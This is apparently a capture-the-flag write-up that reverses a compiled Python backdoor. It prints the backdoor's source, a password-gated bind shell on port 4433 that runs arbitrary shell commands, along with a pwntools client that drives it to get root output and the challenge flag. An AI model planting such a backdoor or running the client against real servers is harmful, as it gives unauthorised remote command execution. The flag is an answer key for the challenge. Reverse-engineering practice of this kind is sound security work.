# Knock knock

### Description

- We found a backdoor on one of our servers and suspect it's being actively exploited. Can you test it out?

### Objective

- Compiled Python executable backdoor.

### Difficulty

- `Easy`

### Flag

- `HTB{l1k3_@_r3al_1nv3stig@t0r!}`

### Release:

- [/release/knock_knock.zip](release/knock_knock.zip) (`346bdfccb5208f0e63de763bf23a25caa3dfa60d609ef4723bec3a616f6b6f27`)

## Challenge

We're given a binary which is unusually large in size.

```shell
$ file backdoor
backdoor: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=294d1f19a085a730da19a6c55788ec08c2187039, stripped

$ du -hs backdoor
7.0M	backdoor
```

Running strings on the binary reveals some Python library related functions.

```
$ strings backdoor

<SNIP>
Py_SetProgramName
Py_SetPythonHome
PyDict_GetItemString
PyErr_Clear
Cannot dlsym for PyErr_Clear
PyErr_Occurred
PyErr_Print
Cannot dlsym for PyErr_Print
<SNIP>
```

This means it could be compiled Python code. The [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor/wiki/Extracting-Linux-ELF-binaries) wiki shows how we can unpack such binaries.

```shell
$ objcopy --dump-section pydata=pydata.dump backdoor
$ python pyinstxtractor.py ../pydata.dump
```

We find compiled python bytecode in the `pydata.dump_extracted/src.pyc` file. Let's use [decompyle3](https://github.com/rocky/python-decompile3) to reconstruct the source code.

```shell
$ decompyle3 pydata.dump_extracted/src.pyc
```

Running the command above gives the following source code:

```python
import socket
from hashlib import md5
from subprocess import check_output
sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 4433))
sock.listen(5)
while True:
    while True:
        client, addr = sock.accept()
        data = client.recv(32)
        if len(data) != 32:
            client.close()

    if data.decode() != md5(b't0p_s3kr3t').hexdigest():
        client.send(b'Invalid')
    size = client.recv(1)
    command = client.recv(int.from_bytes(size, 'little'))
    if not command.startswith(b'command:'):
        client.close()
    else:
        command = command.replace(b'command:', b'')
        output = check_output(command, shell=True)
        client.send(output)
        client.close()
```

As we can see, the script binds to port 4433 and waits for incoming connections. On getting a connect, it receives 32 bytes of data and checks if it's the MD5 hash for `t0p_s3kr3t`. If true, it takes in length of a command starting with `command:` and then the command. This command is executed using `check_output` and the result is returned to the client.

We can write a client program in order to interact with it and execute system commands. 

```python
from pwn import *

while True:
    r = remote("localhost", 4433)
    r.send('8f4328c40b1aa9409012c7406129f04b')
    cmd = input("CMD:\\> ")
    cmd = f"command:{cmd}"
    r.send(hex(len(cmd))[2:])
    r.send(cmd)
    print(r.recvS())
    r.close()
```

The flag can be found in the `/` folder.

```shell
$ python client.py

[*] Closed connection to localhost port 4433
[+] Opening connection to localhost on port 4433: Done
CMD:\> id
uid=0(root) gid=0(root) groups=0(root)
CMD:\> ls
bin
dev
etc
flag.txt
home
lib
<SNIP>
CMD:\> cat f*
HTB{l1k3_@_r3al_1nv3stig@t0r!}
```

